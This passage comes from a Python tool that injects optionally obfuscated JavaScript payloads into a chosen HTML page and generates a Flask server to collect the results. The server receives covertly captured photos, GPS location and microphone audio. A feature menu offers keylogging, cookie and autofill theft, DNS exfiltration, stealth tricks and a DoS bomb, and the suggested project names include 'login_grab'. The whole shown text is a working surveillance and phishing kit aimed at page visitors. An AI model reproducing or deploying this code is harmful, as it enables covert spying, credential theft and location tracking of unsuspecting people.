        print(f\'  {DM}[{_ts()}]{RS} {SEC}[{c}{cam}{SEC}]{RS} {c}Photo {sz}B{RS}\')
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500
'''

ROUTE_LOC = '''
@app.route(\'/loc\', methods=[\'POST\',\'OPTIONS\'])
def loc():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        lat=d.get(\'lat\',\'N/A\'); lon=d.get(\'lon\',\'N/A\')
        print()
        _top()
        _title(f\'  GPS LOCATION  ─  {_ts()}\', GR)
        _sep()
        _row(\'LATITUDE\',  lat,                                           CY)
        _row(\'LONGITUDE\', lon,                                           CY)
        _row(\'ACCURACY\',  str(d.get(\'acc\',\'N/A\'))+\'m\',                WH)
        _row(\'SPEED\',     str(d.get(\'spd\',\'N/A\')),                      WH)
        _row(\'MAPS\',      f\'https://maps.google.com/?q={lat},{lon}\',    GR)
        _row(\'FROM IP\',   request.remote_addr,                           DM)
        _bot(); print()
        fn=os.path.join(CAP[\'logs\'],f\'loc_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500
'''

ROUTE_AUDIO = '''
@app.route(\'/audio\', methods=[\'POST\',\'OPTIONS\'])
def audio():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        if \'audio\' not in request.files: return jsonify({\'status\':\'error\'}),400
        f=request.files[\'audio\']
        fn=os.path.join(CAP[\'audio\'],f\'audio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.webm\')
        f.save(fn); sz=os.path.getsize(fn)
        print(f\'  {DM}[{_ts()}]{RS} {SEC}[{RD}MIC{SEC}]{RS} {RD}Audio {sz}B{RS}\')
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500
'''


# ══════════════════════════════════════════════════════════════
# OBFUSCATOR (preserved from v2)
# ══════════════════════════════════════════════════════════════

def obfuscate_js(js_block):
    import re, random, hashlib
    random.seed(1337)
    BROWSER_STRINGS = {
        'POST','GET','PUT','DELETE','OPTIONS','HEAD',
        'Content-Type','application/json','text/html','text/plain',
        'keydown','keyup','click','mouseup','mousemove','scroll',
        'submit','blur','focus','change','input','load','resize',
        'visibilitychange','beforeunload','copy','paste','cut',
        'connect','touchstart','video','audio','audioinput','videoinput','audiooutput',
        'granted','denied','default','prompt',
        'undefined','null','true','false',
        'function','var','let','const','return',
        'image/jpeg','image/png','audio/webm','application/javascript',
    }
    script_re = re.compile(r'(<script[^>]*>)(.*?)(</script>)', re.DOTALL | re.IGNORECASE)
    def obf_one(match):
        open_tag=match.group(1); js=match.group(2); close_tag=match.group(3)
        if not js.strip() or 'src=' in open_tag: return match.group(0)
        str_re=re.compile(r"'([^'\\]*(?:\\.[^'\\]*)*)'"+r'|"([^"\\]*(?:\\.[^"\\]*)*)"')
        pool=[]
        def should_encode(s):
            if s in BROWSER_STRINGS: return False
            if len(s)<3: return False
            if s.startswith('/'): return True
            if len(s)>20: return True
            return False
        def collect(m):
            s=m.group(1) if m.group(1) is not None else m.group(2)
            if should_encode(s) and s not in pool: pool.append(s)
            return m.group(0)
        str_re.sub(collect,js)
        obf=js
        if pool:
            ph=hashlib.md5(b'pool').hexdigest()[:4]; gh=hashlib.md5(b'get').hexdigest()[:4]
            pool_name=f'_0x{ph}'; get_name=f'_0x{gh}'
            def hex_enc(s): return ''.join(f'\\x{ord(c):02x}' for c in s)
            arr='['+','.join(f'"{hex_enc(s)}"' for s in pool)+']'
            pool_code=f'var {pool_name}={arr};function {get_name}(i)'+'{'+ f'return {pool_name}[i];'+'}\n'
            def replace_str(m):
                s=m.group(1) if m.group(1) is not None else m.group(2)
                if s in pool: return f'{get_name}({pool.index(s)})'
                return m.group(0)
            obf=str_re.sub(replace_str,obf); obf=pool_code+obf
        dead=''
        for i in range(5):
            h=hashlib.md5(f'dead{i}{random.random()}'.encode()).hexdigest()[:4]
            dead+=f'var _0x{h}={random.randint(1000,9999)};'
        arg=f'_0x{hashlib.md5(b"arg").hexdigest()[:4]}'; val=random.randint(100,999)
        final=f';(function({arg}){{{dead}\n{obf}\n}})({val});'
        return open_tag+'\n'+final+'\n'+close_tag
    return script_re.sub(obf_one,js_block)


# ══════════════════════════════════════════════════════════════
# BUILD
# ══════════════════════════════════════════════════════════════

PAYLOAD_MAP = {
    'camera':      js_camera,
    'location':    None,  # handled separately
    'mic':         js_mic,
    'notify':      js_notify,
    'screencap':   js_screencap,
    'midi':        js_midi,
    'bluetooth':   js_bluetooth,
    'usb':         js_usb,
    'battery':     js_battery,
    'ssid':        js_ssid,
    'accel':       js_accel,
    'light':       js_light,
    'contacts':    js_contacts,
    'vibrate':     js_vibrate,
    'wakelock':    js_wakelock,
    'titlespoof':  js_titlespoof,
    'magneto':     js_magneto,
    'proximity':   js_proximity,
    'pressure':    js_pressure,
    'charging':    js_charging,
    'orientlock':  js_orientlock,
    'tzfp':        js_tzfp,
    'carrier':     js_carrier,
    'vpn':         js_vpn,
    'tor':         js_tor,
    'ipgeo':       js_ipgeo,
    'cookies':     js_cookies,
    'autofill':    js_autofill,
    'historytime': js_historytime,
    'idbscan':     js_idbscan,
    'cachetiming': js_cachetiming,
    'sw':          js_sw,
    'keystroke':   js_keystroke,
    'touchfp':     js_touchfp,
    'scrollpat':   js_scrollpat,
    'websocket':   js_websocket_persistent,
    'dnsexfil':    js_dnsexfil,
    'beacon':      js_beacon,
    'antiss':      js_antiss,
    'anticlose':   js_anticlose,
    'dos':         js_dos,
}

def build_js(features, cam_iv=1.0, loc_mode='once', loc_iv=5, mic_chunk=30, do_obfuscate=False):
    parts = [JS_SILENT]
    for feat in features:
        if feat == 'location':
            if loc_mode == 'once': parts.append(js_location_once())
            else:                  parts.append(js_location_track(loc_iv))
        elif feat == 'camera':
            parts.append(js_camera(cam_iv))
        elif feat == 'mic':
            parts.append(js_mic(mic_chunk))
        elif feat in PAYLOAD_MAP and PAYLOAD_MAP[feat]:
            fn = PAYLOAD_MAP[feat]
            parts.append(fn())
    combined = '\n'.join(parts)
    if do_obfuscate:
        combined = obfuscate_js(combined)
    return combined

def inject(html, js):
    tag = '</body>'; lo = html.lower()
    if tag in lo:
        idx = lo.rfind(tag)
        return html[:idx] + '\n' + js + '\n' + html[idx:]
    return html + '\n' + js

def build_app(theme_key, project, html_name, features, cam_iv, loc_mode, loc_iv, mic_chunk):
    th = THEMES[theme_key]
    feature_str = ', '.join(features) if features else 'silent only'
    extra = []
    if 'camera'   in features: extra.append(ROUTE_PHOTO)
    if 'location' in features: extra.append(ROUTE_LOC)
    if 'mic'      in features: extra.append(ROUTE_AUDIO)
    extra_str = '\n'.join(extra)
    code = APP_TEMPLATE
    code = code.replace('__PROJECT_UPPER__', project.upper())
    code = code.replace('__PROJECT__',       project)
    code = code.replace('__THEME__',         th['name'])
    code = code.replace('__FEATURES__',      feature_str)
    code = code.replace('__HTML__',          html_name)
    code = code.replace('__PRI__',           th['pri_raw'])
    code = code.replace('__SEC__',           th['sec_raw'])
    code = code.replace('__ACC__',           th['acc_raw'])
    code = code.replace('__BC__',            th['bc'])
    code = code.replace('__SC__',            th['sc'])
    code = code.replace('__EXTRA_ROUTES__',  extra_str)
    return code


# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════

def main():
    global TH
    boot(); banner()

    # ── Step 1: Theme ──────────────────────────────────────────
    print()
    box_top(); box_title('STEP 1 — SELECT THEME'); box_sep()
    tcols=['\033[1;33m','\033[1;91m','\033[1;96m','\033[1;97m']
    for k,th in THEMES.items():
        box_row(k, th['name'], tcols[int(k)-1])
    box_bot(); print()
    theme_key = ask('Pick theme [1/2/3/4]', lambda x: x if x in THEMES else None)
    TH = THEMES[theme_key]
    os.system('clear'); banner()

    # ── Step 2: HTML file ─────────────────────────────────────
    print()
    box_top(); box_title('STEP 2 — DROP TARGET HTML FILE'); box_sep()
    box_row('TIP', 'Drag & drop the HTML file into this terminal', WH)
    box_bot(); print()
    def v_html(val):
        p = val.strip().strip("'\"")
        if os.path.isfile(p): return p
    html_path = ask('Drop HTML file here', v_html)
    with open(html_path, 'r', encoding='utf-8', errors='ignore') as f:
        src = f.read()
    log(f"Loaded {os.path.basename(html_path)} ({len(src):,} bytes)", 'ok')

    # ── Step 3: Output path ───────────────────────────────────
    print()
    box_top(); box_title('STEP 3 — OUTPUT FOLDER PATH'); box_sep()
    box_row('TIP', 'Drag a folder or type a path', WH)
    box_bot(); print()
    def v_dir(val):
        p = val.strip().strip("'\"")
        try: os.makedirs(p, exist_ok=True); return p
        except: pass
    out_root = ask('Output folder path', v_dir)

    # ── Step 4: Project name ──────────────────────────────────
    print()
    box_top(); box_title('STEP 4 — PROJECT NAME'); box_sep()
    box_row('EXAMPLE', 'operation_x  |  update_v2  |  login_grab', WH)
    box_bot(); print()
    project = re.sub(r'[^\w\-]', '_', ask('Project name'))

    # ── Step 5: HTML output name ──────────────────────────────
    print()
    box_top(); box_title('STEP 5 — OUTPUT HTML FILENAME'); box_sep()
    box_row('EXAMPLE', 'login  |  verify  |  update', WH)
    box_row('NOTE',    'No .html extension needed', DM)
    box_bot(); print()
    html_name = re.sub(r'[^\w\-]', '_', ask('HTML filename (no extension)'))

    # ── Step 6: Feature picker ────────────────────────────────
    os.system('clear'); banner(); print()
    box_top(); box_title('STEP 6 — SELECT FEATURES'); box_sep('TYPE NUMBERS SPACE-SEPARATED e.g. 1 3 7 12')
    box_sep('CAMERA / MIC / LOCATION')
    box_row(' 1', ALL_FEATURES[0][2], '\033[1;33m')
    box_row(' 2', ALL_FEATURES[1][2], '\033[1;96m')
    box_row(' 3', ALL_FEATURES[2][2], '\033[1;91m')
    box_sep('PERMISSION-BASED')
    box_row(' 4', ALL_FEATURES[3][2], '\033[1;92m')
    box_row(' 5', ALL_FEATURES[4][2], '\033[1;35m')
    box_row(' 6', ALL_FEATURES[5][2], '\033[1;34m')
    box_row(' 7', ALL_FEATURES[6][2], '\033[1;36m')
    box_row(' 8', ALL_FEATURES[7][2], '\033[1;37m')
    box_sep('DEVICE / HARDWARE')
    box_row(' 9', ALL_FEATURES[8][2],  '\033[1;93m')
    box_row('10', ALL_FEATURES[9][2],  '\033[1;96m')
    box_row('11', ALL_FEATURES[10][2], '\033[1;97m')
    box_row('12', ALL_FEATURES[11][2], '\033[0;37m')
    box_row('13', ALL_FEATURES[12][2], '\033[1;92m')
    box_row('14', ALL_FEATURES[13][2], '\033[1;97m')
    box_row('15', ALL_FEATURES[14][2], '\033[1;93m')
    box_row('16', ALL_FEATURES[15][2], '\033[1;35m')
    box_row('17', ALL_FEATURES[16][2], '\033[1;96m')
    box_row('18', ALL_FEATURES[17][2], '\033[1;92m')
    box_row('19', ALL_FEATURES[18][2], '\033[1;93m')
    box_row('20', ALL_FEATURES[19][2], '\033[1;91m')
    box_row('21', ALL_FEATURES[20][2], '\033[1;97m')
    box_sep('NETWORK / IDENTITY')
    box_row('22', ALL_FEATURES[21][2], '\033[1;96m')
    box_row('23', ALL_FEATURES[22][2], '\033[1;34m')
    box_row('24', ALL_FEATURES[23][2], '\033[1;91m')
    box_row('25', ALL_FEATURES[24][2], '\033[0;37m')
    box_row('26', ALL_FEATURES[25][2], '\033[1;92m')
    box_sep('BROWSER / SESSION')
    box_row('27', ALL_FEATURES[26][2], '\033[1;35m')
    box_row('28', ALL_FEATURES[27][2], '\033[1;92m')
    box_row('29', ALL_FEATURES[28][2], '\033[0;37m')
    box_row('30', ALL_FEATURES[29][2], '\033[1;96m')
    box_row('31', ALL_FEATURES[30][2], '\033[1;93m')
    box_row('32', ALL_FEATURES[31][2], '\033[1;97m')
    box_sep('BEHAVIORAL')
    box_row('33', ALL_FEATURES[32][2], '\033[1;93m')
    box_row('34', ALL_FEATURES[33][2], '\033[1;96m')
    box_row('35', ALL_FEATURES[34][2], '\033[0;37m')
    box_sep('EXFILTRATION')
    box_row('36', ALL_FEATURES[35][2], '\033[1;34m')
    box_row('37', ALL_FEATURES[36][2], '\033[1;36m')
    box_row('38', ALL_FEATURES[37][2], '\033[1;91m')
    box_sep('STEALTH')
    box_row('39', ALL_FEATURES[38][2], '\033[1;97m')
    box_row('40', ALL_FEATURES[39][2], '\033[1;93m')
    box_sep('DOS BOMB')
    box_row('41', ALL_FEATURES[40][2], '\033[1;91m')
    box_sep()
    box_row('ALL', 'Type "all" to select everything', GR)
    box_bot(); print()

    def v_feats(val):
        val = val.strip().lower()
        if val == 'all': return list(range(1, 42))
        picks = []
        for p in val.replace(',', ' ').split():
            try:
                n = int(p)
                if 1 <= n <= 41: picks.append(n)
            except: pass
        return picks if picks else None

    selected_nums = ask('Select features (numbers, space-separated, or "all")', v_feats)
    features = [ALL_FEATURES[n-1][0] for n in selected_nums]

    # ── Step 7: Configure camera ──────────────────────────────
    cam_iv = 1.0; loc_mode = 'once'; loc_iv = 5; mic_chunk = 30

    if 'camera' in features:
        print()
        box_top(); box_title('CAMERA — CAPTURE INTERVAL'); box_sep()
        box_row('0.1s', 'Very fast (100ms)',  YL)
        box_row('1s',   'Fast (1 photo/sec)', WH)
        box_row('5s',   'Medium',             WH)
        box_row('10s',  'Slow',               DM)
        box_bot(); print()
        cam_iv = ask_float('Photo every N seconds', 0.1, 10.0)

    if 'location' in features:
        print()
        box_top(); box_title('LOCATION — MODE'); box_sep()
        box_row('1', 'One-time only',          WH)
        box_row('2', 'Live tracking (repeat)', WH)
        box_bot(); print()
        lc = ask('Mode [1/2]', lambda x: x if x in ['1','2'] else None)
        if lc == '2':
            loc_mode = 'track'
            print()
            box_top(); box_title('LOCATION — INTERVAL'); box_sep()
            box_bot(); print()
            loc_iv = ask_int('Track every N seconds', 1, 60)
        else:
            loc_mode = 'once'

    if 'mic' in features:
        print()
        box_top(); box_title('MICROPHONE — CHUNK SIZE'); box_sep()
        box_row('1', '30 second chunks', WH)
        box_row('2', '60 second chunks', WH)
        box_bot(); print()
        mc = ask('Chunk size [1/2]', lambda x: x if x in ['1','2'] else None)
        mic_chunk = 30 if mc == '1' else 60

    # ── Step 8: Obfuscate ─────────────────────────────────────
    print()
    box_top(); box_title('STEP 7 — OBFUSCATOR'); box_sep()
    box_row('1', 'YES — mangle + hex-encode + dead code', GR)
    box_row('2', 'NO  — plaintext JS',                   DM)
    box_bot(); print()
    obf_ans = ask('Obfuscate? [1/2]', lambda x: x if x in ['1','2'] else None)
    do_obfuscate = (obf_ans == '1')

    # ── Step 9: Build ─────────────────────────────────────────
    print()
    log('Injecting all payloads...', 'info'); time.sleep(0.2)
    js = build_js(features, cam_iv, loc_mode, loc_iv, mic_chunk, do_obfuscate)
    if do_obfuscate:
        log('Obfuscation complete', 'ok')
    injected = inject(src, js)

    log('Generating app.py...', 'info'); time.sleep(0.2)
    app_code = build_app(theme_key, project, html_name, features,
                         cam_iv, loc_mode, loc_iv, mic_chunk)

    log('Validating syntax...', 'info')
    try:
        ast.parse(app_code); log('app.py syntax OK', 'ok')
    except SyntaxError as e:
        log(f'Syntax error in app.py: {e}', 'err')

    log('Creating folder structure...', 'info'); time.sleep(0.1)
    proj_path = os.path.join(out_root, project)
    for d in ['captures/photos','captures/audio','captures/logs','captures/screenshots',
              'captures/keylogs','captures/screencaps','captures/misc','templates']:
        os.makedirs(os.path.join(proj_path, d), exist_ok=True)

    html_out = os.path.join(proj_path, 'templates', f'{html_name}.html')
    app_out  = os.path.join(proj_path, 'app.py')
    req_out  = os.path.join(proj_path, 'requirements.txt')

    with open(html_out, 'w', encoding='utf-8') as f: f.write(injected)
    with open(app_out,  'w', encoding='utf-8') as f: f.write(app_code)
    with open(req_out,  'w')                   as f: f.write('flask\nrequests\n')

    # ── Done ───────────────────────────────────────────────────
    os.system('clear'); banner(); print()
    box_top()
    box_title('INJECTION COMPLETE — v3.0' + (' [OBFUSCATED]' if do_obfuscate else ''))
    box_sep('PROJECT')
    box_row('NAME',    project,             pri())
    box_row('PATH',    proj_path,           WH)
    box_row('HTML',    f'{html_name}.html', acc())
    box_sep('SELECTED FEATURES')
    for feat_key in features:
        feat_info = next((f for f in ALL_FEATURES if f[0]==feat_key), None)
        if feat_info:
            box_row(feat_info[1], feat_info[2], GR)
    box_sep('OUTPUT')
    box_row('app.py',     app_out,  WH)
    box_row('templates/', html_out, WH)
    box_row('captures/',  'photos/ audio/ logs/ ss/ keys/ scaps/ misc/', DM)
    box_sep('RUN')
    box_row('CMD', f'cd {proj_path}', WH)
    box_row('',    'pip install flask --break-system-packages', WH)
    box_row('',    'python3 app.py', GR)
    box_bot(); print()


if __name__ == '__main__':
    main()
